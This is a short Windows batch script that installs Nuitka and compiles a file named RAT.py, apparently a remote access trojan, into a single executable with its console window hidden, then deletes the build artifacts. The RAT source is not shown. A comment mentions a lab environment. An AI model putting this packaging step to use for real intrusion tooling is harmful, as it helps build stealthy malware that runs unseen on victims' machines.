@echo off
if not exist RAT.py (
    echo RAT.py not found. Please place it in this directory.
    pause
    exit /b 1
)
REM Install/upgrade Nuitka if needed
python -m pip install --upgrade pip
python -m pip install nuitka REM Optional note: Use conda for lab env if pip fails

REM Compile RAT.py
python -m nuitka --onefile --enable-plugin=tk-inter --windows-console-mode=disable --include-module=pyttsx3.drivers.sapi5 RAT.py

REM Cleanup
del /s /q /f RAT.py.build
rmdir /s /q __pycache__
rmdir /s /q .build .onefile-build

pause